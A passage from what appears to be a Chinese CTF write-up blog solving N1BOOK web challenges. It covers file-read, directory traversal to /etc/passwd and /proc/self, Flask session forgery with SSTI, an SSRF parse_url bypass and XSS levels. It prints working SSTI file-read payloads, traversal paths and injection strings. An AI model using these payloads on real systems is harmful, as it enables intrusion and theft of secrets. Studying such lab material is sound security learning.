</p><ol><li>有的网站会开启错误调试信息方便开发者调试，可以利用报错信息进行报错注入。</li><li>updatexml第二个参数应为合法XPATH路径，否则会在引发报错的同时输出传入的参数。</li><li>如果没有报错提示,可以bool注入。</li><li>这里刚好admin存在，所以可以用and。以后还是要用<strong>or</strong>，使条件永真。</li><li><a href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/">SQL注入针对关键字过滤的绕过技巧 - zu1k</a></li></ol></blockquote><h1 id="第一章-web入门-afr-1"><a href="#第一章-web入门-afr-1" class="headerlink" title="[第一章 web入门]afr_1"></a>[第一章 web入门]afr_1</h1><p>p输入其他值均无反应，只有flag时显示nonono，猜测可能内容被注释。<br><img src="/../images/Pasted%20image%2020241112183931.png"></p><p>想到php伪协议读取源代码：<code>php://filter/read=convert.base64-encode/resource=flag</code><br><img src="/../images/Pasted%20image%2020241112184934.png"></p><p>解码出的内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no no no&#x27;</span>);<br><span class="hljs-comment">//n1book&#123;afr_1_solved&#125;</span><br></code></pre></td></tr></table></figure><h1 id="第一章-web入门-afr-2"><a href="#第一章-web入门-afr-2" class="headerlink" title="[第一章 web入门]afr_2"></a>[第一章 web入门]afr_2</h1><p>F12源码查看gif的位置在<code>img/img.gif</code>，有一个目录，想到目录穿越。</p><p>访问img..&#x2F;穿越到根目录，查看flag。<br><img src="/../images/Pasted%20image%2020241112190853.png"></p><h1 id="第一章-web入门-afr-3"><a href="#第一章-web入门-afr-3" class="headerlink" title="[第一章 web入门]afr_3"></a>[第一章 web入门]afr_3</h1><h2 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h2><p><img src="/../images/Pasted%20image%2020241113121303.png"></p><ul><li>&#x2F;：是所有文件的根目录；</li><li>&#x2F;bin：存放二进制可执行命令目录；</li><li>&#x2F;home：用户主目录的基点目录，默认情况每个用户主目录都设在该目录下；</li><li>&#x2F;lib：存放标准程序设计库目录，又叫动态链接共享库目录，目录中文件类似windows里的后缀名为dll的文件；</li><li>&#x2F;etc：存放系统管理和配置文件目录；</li><li>&#x2F;dev：存放设备特殊文件目录，如声卡文件，磁盘文件等；</li><li>&#x2F;usr：最庞大的目录，存放应用程序和文件目录；</li><li>&#x2F;proc：虚拟目录，是系统内存的映射，可直接访问这个目录来获取系统信息；</li><li>&#x2F;root：系统管理员的主目录；</li><li>&#x2F;var：存放系统产生的经常变化文件的目录，例如打印机、邮件等假脱机目录、日志文件、格式化后的手册页以及一些应用程序的数据文件等；</li><li>&#x2F;tmp：存放公用临时文件目录。</li></ul><h2 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h2><ul><li>&#x2F;etc：多是各种应用或系统配置文件，所以其下的文件是进行文件读取的首要目标。</li><li>&#x2F;etc&#x2F;passwd：保存用户信息及其工作目录的文件，权限是所有用户&#x2F;组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。</li><li>&#x2F;etc&#x2F;shadow：保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下，这个文件是不可读的。</li><li>&#x2F;etc&#x2F;apache2&#x2F;* ：Apache配置文件，可以获知Web目录、服务端口等信息。CTF有些题目需要参赛者确认Web路径。</li><li>&#x2F;etc&#x2F;nginx&#x2F;* ：Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。</li><li>&#x2F;etc&#x2F;apparmor（.d）&#x2F;* ：是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。例如，通过读配置文件查看MySQL是否禁止了系统调用，从而确定是否可以使用UDF（User Defined Functions）执行系统命令。</li><li>&#x2F;etc&#x2F;（cron.d&#x2F;* |crontab）：定时任务文件。有些CTF题目会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其他文件。</li><li>&#x2F;etc&#x2F;environment：环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。</li><li>&#x2F;etc&#x2F;hostname：表示主机名。</li><li>&#x2F;etc&#x2F;hosts：主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP&#x2F;域名。</li><li>&#x2F;etc&#x2F;issue：指明系统版本。</li><li>&#x2F;proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需 <strong>&#x2F;proc&#x2F;self&#x2F;</strong> 代替&#x2F;proc&#x2F;[pid]&#x2F;即可。对应目录下的cmdline可读出比较敏感的信息，如使用mysql-uxxx-pxxxx登录MySQL，会在cmdline中显示明文密码：<br><img src="/../images/Pasted%20image%2020241113123711.png"></li></ul><h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask-session伪造"></a>flask-session伪造</h2><ol><li><p>session的作用<br>由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。 用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息。</p></li><li><p>漏洞成因<br>session一般都是存储在服务器端的，但是由于flask是轻量级的框架，所以把<strong>session存储在了客户端的cookie中</strong>，导致了session伪造的漏洞，从而达到冒充其他用户的目的。</p></li><li><p>flask的session格式<br>flask的session格式一般是由base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。</p></li></ol><p>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p><p>签名：是利用Hmac算法，将session数据和时间戳加上<code>secret_key</code>加密而成的，用来保证数据没有被修改。</p><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ<span class="hljs-selector-class">.Y48ncA</span><span class="hljs-selector-class">.H99Th2w4FzzphEX8qAeiSPuUF_0</span><br>session数据                                     时间戳       签名            <br></code></pre></td></tr></table></figure><p>所以要进行session伪造就必须先得到secret_key。</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>退到上一层，发现给出了路径：<br><img src="/../images/Pasted%20image%2020241113130422.png"></p><p>开始尝试目录穿越，首先尝试<code>/etc</code>，发现存在但是访问不了：<br><img src="/../images/Pasted%20image%2020241113130736.png"></p><p>查看<code>/etc/passwd</code>：<br><img src="/../images/Pasted%20image%2020241113130852.png"></p><p><code>/proc/self/cmdline</code>查看当前进程命令行记录：<br><img src="/../images/Pasted%20image%2020241113131412.png"></p><p><code>../../../proc/self/cwd</code>跳转到进程的运行目录，<code>../../../proc/self/cwd/server.py</code>获取源码：<br><img src="/../images/Pasted%20image%2020241113132212.png"></p><p>代码审计：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> ( Flask, render_template, request, url_for, redirect, session, render_template_string )<br><span class="hljs-keyword">from</span> flask_session <span class="hljs-keyword">import</span> Session<br> <br>app = Flask(__name__)<br>execfile(<span class="hljs-string">&#x27;flag.py&#x27;</span>)<br>execfile(<span class="hljs-string">&#x27;key.py&#x27;</span>)<br> <br>FLAG = flag<br>app.secret_key = key<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/n1page&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">n1page</span>():<br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;index&quot;</span>))<br>    n1code = request.form.get(<span class="hljs-string">&quot;n1code&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span> <br>    <span class="hljs-keyword">if</span> n1code <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        n1code = n1code.replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;n1code&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;n1code&#x27;</span>] <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        session[<span class="hljs-string">&#x27;n1code&#x27;</span>] = n1code <span class="hljs-comment"># 将n1code存储在session中</span><br>    template = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;n1code&#x27;</span>] <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        template = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="hljs-string">&#x27;n1code&#x27;</span>] <br>        <span class="hljs-comment"># 根据session[&#x27;n1code&#x27;]渲染模板，生成一个包含session[&#x27;n1code&#x27;]的HTML页面内容。</span><br>        session[<span class="hljs-string">&#x27;n1code&#x27;</span>] = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)     <br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;main.html&quot;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/article&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">article</span>():<br>    error = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> request.args:<br>        page = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        page = <span class="hljs-string">&#x27;article&#x27;</span><br>    <span class="hljs-keyword">if</span> page.find(<span class="hljs-string">&#x27;flag&#x27;</span>)&gt;=<span class="hljs-number">0</span>:<br>        page = <span class="hljs-string">&#x27;notallowed.txt&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        template = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(page)).read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        template = e<br> <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, template=template)<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>发现flag.py和key.py，分别访问。flag.py被禁止访问，key.py内容如下，即session伪造所需的secert_key：<br><img src="/../images/Pasted%20image%2020241113142800.png"><br> <br><code>n1code = request.form.get(&quot;n1code&quot;)</code>获取请求中的 n1code表单数据。<br> <img src="/../images/Pasted%20image%2020241113141354.png">  </p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">template</span> = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="hljs-string">&#x27;n1code&#x27;</span>]<br></code></pre></td></tr></table></figure><p> session[‘n1code’] 直接被嵌入到HTML模板中，这里存在<strong>SSTI漏洞</strong>。该语句会将session[‘n1code’]的值打印出来。所以我们需要伪造session[‘n1code’] ，能让flag.py的值被打印出来。</p><p>使用<a href="https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/scripts/flask_session_cookie_hack.py">flask session hack</a>脚本。</p><ul><li>解密：<code>python flask_session_cookie_hack.py decode -c &#123;cookie&#125; -s &#123;secert_key&#125;</code></li></ul><p>首先获取本次session的cookie值：<br><img src="/../images/Pasted%20image%2020241113152315.png"></p><p><img src="/../images/Pasted%20image%2020241113153229.png"></p><p>将解密后的session复制下来，把None换成读文件flag.py的代码，加密回去 <code>&#123;&#39;n1code&#39;: &#39;&#123;&#123;"a".__class__.__mro__[2].__subclasses__()[40]('flag.py').read()&#125;&#125;&#39;&#125;</code>。</p><ul><li>加密：<code>python flask_session_cookie_hack.py encode -t &#123;&#125; -s &#123;secert_key&#125;</code></li></ul><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&#123;&#x27;n1code&#x27;: &#x27;</span><span class="hljs-template-variable">&#123;&#123;\<span class="hljs-name">&#x27;\&#x27;.__class__.__mro__</span>[1].__subclasses__()[40](\<span class="hljs-name">&#x27;flag.py\&#x27;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;&#125;</span><br></code></pre></td></tr></table></figure><p>注意单引号需要转义：<br><img src="/../images/Pasted%20image%2020241113161419.png"></p><p>得到cookie。抓包，加上cookie值：<br><img src="/../images/Pasted%20image%2020241113162211.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>考察对flask框架的cookie、session加解密知识。</li><li>考察<code>../../../../../</code>目录穿越。</li><li>考察目录穿越后获取信息的能力。<ul><li><code>/proc/self/environ</code> 当前进程环境变量</li><li><code>/proc/self/cmdline</code> 当前进程命令行，得到<code>python server.py</code>命令</li><li><code>/proc/self/cwd</code> 跳转到当前进程工作目录。</li></ul></li><li>考察SSTI(模板注入)<br>  <code>&#123;&#39;n1code&#39;: &#39;&#123;&#123;\'\'.__class__.__mro__[2].__subclasses__()[40](\'flag.py\').read()&#125;&#125;&#39;&#125;</code></li><li>SSTI常用命令：<ul><li><strong>读取文件内容1，()也可以为’’</strong><br>  <code>&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['open']("/app/server.py").read()&#125;&#125;</code></li><li><strong>读取文件内容2</strong> <code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read()&#125;&#125;</code></li><li><strong>获取配置</strong><br>  <code>&#123;&#123;config.items()&#125;&#125;</code></li><li><strong>自身dict</strong><br>  <code>&#123;&#123;self.__dict__&#125;&#125;</code></li><li><strong>获取当前app配置</strong><br>  <code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></li><li><strong>__getitem__绕过[]</strong><br>  <code>&#123;&#123;get_flashed_messages.__globals__.__getitem__('current_app').config&#125;&#125;</code></li><li><strong>url_for减少字符长度</strong><br>  <code>&#123;&#123;url_for.__globals__.__getitem__('current_app').config&#125;&#125;</code></li><li><strong>Tornado Web server的SSTI</strong> <br>  <code>handler.settings</code></li></ul></li></ul><h1 id="第二章-web进阶-SSRF-Training"><a href="#第二章-web进阶-SSRF-Training" class="headerlink" title="[第二章 web进阶]SSRF Training"></a>[第二章 web进阶]SSRF Training</h1><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><a href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF - FreeBuf网络安全行业门户</a></p><p>SSRF（Server Side Request Forgery，服务端请求伪造）是一种攻击者通过构造数据进而伪造服务器端发起请求的漏洞。因为请求是由内部发起的，所以一般情况下，SSRF漏洞攻击的目标往往是从<strong>外网无法访问的内部系统</strong>。</p><p>SSRF漏洞形成的原因多是服务端提供了从外部服务获取数据的功能，但没有对目标地址、协议等重要参数进行过滤和限制，从而导致攻击者可以自由构造参数，而发起预期外的请求。</p><p>理解URL构造对如何进行绕过和如何利用很有帮助。<br><img src="/../images/Pasted%20image%2020241113192136.png"><br><img src="/../images/Pasted%20image%2020241113192211.png"></p><h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><p><img src="/../images/Pasted%20image%2020241113195334.png"></p><p>需要传入一个url，使其能够访问<code>localhost</code>下的<code>flag.php</code>。</p><p>代码审计：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>); <br>    <span class="hljs-comment"># 检查url格式</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>) <br>    &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>    &#125; <br>    <span class="hljs-keyword">try</span> <br>    &#123; <br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>); <br>        <span class="hljs-comment"># 分解url</span><br>    &#125; <br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) <br>    &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125; <br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>]; <span class="hljs-comment">#获取主机名</span><br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>); <span class="hljs-comment">#通过主机名获取ip</span><br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">#ip2long：将IPv4的ip地址（以小数点分隔形式）转换为int</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>; <br>&#125; <span class="hljs-comment">#判断是否是私有地址，是则这个函数就返回1</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span><br><span class="hljs-function"></span>&#123;    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>)) <br>    &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>; <br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>); <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]) <br>        &#123; <br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>); <br>    &#125;     <br>&#125; <br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123; <br>    <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><strong>payload</strong>: <code>http://a:@127.0.0.1:80@www.baidu.com/flag.php</code></p><p>利用了<code>curl</code>与<code>parse_url</code>解析URL的规则不同，绕过局域网ip限制。</p><p>parse_url：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">```php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://a:@127.0.0.1:80@baidu.com/flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [scheme] =&gt; http</span><br><span class="hljs-comment">    [host] =&gt; baidu.com</span><br><span class="hljs-comment">    [user] =&gt; a</span><br><span class="hljs-comment">    [pass] =&gt; @127.0.0.1:80</span><br><span class="hljs-comment">    [path] =&gt; /flag.php</span><br><span class="hljs-comment">)</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>发现 parse_url取到的host是baidu.com,而curl取到的是127.0.0.1:80，所以就实现了检测IP时候是一个正常的一个网站域名而实际curl请求的时候是构造的127.0.0.1，以此实现了SSRF攻击。</p><p>除了PHP，不同语言对URL的解析方式各不相同。</p><h1 id="第二章-web进阶-XSS闯关"><a href="#第二章-web进阶-XSS闯关" class="headerlink" title="[第二章 web进阶]XSS闯关"></a>[第二章 web进阶]XSS闯关</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><a href="https://cloud.tencent.com/developer/article/1768520">这一次，彻底理解XSS攻击-腾讯云开发者社区-腾讯云</a><br><a href="https://www.freebuf.com/articles/web/334662.html">从0到1完全掌握 XSS - FreeBuf网络安全行业门户</a><br><a href="https://xz.aliyun.com/t/8459?time__1311=n4+xnD0DcDuDyDRx7qiKYGNnpB7epbHbqcID">XSS 实战攻击思路总结 - 先知社区</a><br>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS只是简单的把用户输入的数据从<a href="https://cloud.tencent.com/product/cvm/?from_column=20065&from=20065">服务器</a>反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。<br><img src="/../images/Pasted%20image%2020241114115006.png"></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型（或 HTML 注入型&#x2F;持久型）XSS 攻击最常发生在由社区内容驱动的网站或 Web 邮件网站，不需要特制的链接来执行。黑客仅仅需要提交 XSS 漏洞利用代码（反射型XSS通常只在url中）到一个网站上其他用户可能访问的地方。一旦用户访问受感染的页，执行是自动的。<br><img src="/../images/Pasted%20image%2020241114115521.png"></p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM（Document Object Model，文档对象模型）是浏览器将 HTML 和 XML 文档结构化后的一种编程接口。通过 DOM，开发人员可以动态地访问、修改和操作网页的内容和结构。它将页面的各个部分（如元素、属性和文本）表示为对象的层级结构，使 JavaScript 等脚本语言能够操作页面内容。</p><p>在 DOM 型 XSS 中，恶意输入通过客户端 JavaScript 操作（如 <code>window.location</code>、<code>document.referrer</code> 或 <code>element.innerHTML</code> 等）直接插入到 DOM 中，导致浏览器执行恶意代码。此类漏洞不会在服务器端进行任何操作或存储，而是利用了页面中的 JavaScript 代码在客户端执行的特点。</p><h2 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>本环境为闯关形式，每过一关即可进入下一关,过关目标为利用XSS漏洞在页面执行alert函数。</p><p><strong>level 1：</strong><br><img src="/../images/Pasted%20image%2020241114135826.png"></p><p>发现get的username直接显示在页面上，于是直接注入js代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">?username=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>level 2:</strong><br>查看源代码：<br><img src="/../images/Pasted%20image%2020241114140712.png"></p><p><code>escape()</code> 函数会将特殊字符转换为百分比编码，所以对 <code>&lt;</code> 和 <code>&gt;</code> 字符进行了转义，导致js代码无法被执行。</p><figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">escape<span class="hljs-comment">(&quot;&lt;script&gt;alert(1)</span>&lt;/script&gt;<span class="hljs-string">&quot;);</span><br><span class="hljs-string">// 结果：&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>Cscript<span class="hljs-meta">%</span><span class="hljs-number">3</span>Ealert<span class="hljs-comment">(1)</span><span class="hljs-meta">%</span><span class="hljs-number">3</span>C/script<span class="hljs-meta">%</span><span class="hljs-number">3</span>E<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>但如果注入</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">?username=xss&#x27;;alert<span class="hljs-params">(1)</span>;&#x27;xss<br><span class="hljs-string">//</span>或者将后面的单引号注释<br>username=xss&#x27;;alert<span class="hljs-params">(1)</span>;<span class="hljs-string">//</span><br><span class="hljs-string">//JavaScript</span> 中并不识别 `<span class="hljs-comment">#` 作为注释符。</span><br></code></pre></td></tr></table></figure><p>那么前面两个单引号就会闭合，执行以下代码：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">var <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;xss&#x27;</span>;<br>alert(1);<br><span class="hljs-string">&#x27;xss&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>level 3:</strong><br><img src="/../images/Pasted%20image%2020241114143625.png"></p><p>依旧用上一关的的payload，发现单引号被转义。<br><img src="/../images/Pasted%20image%2020241114145007.png"><br>再加一个单引号</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=xss<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">;alert(1);//</span><br></code></pre></td></tr></table></figure><p><strong>level 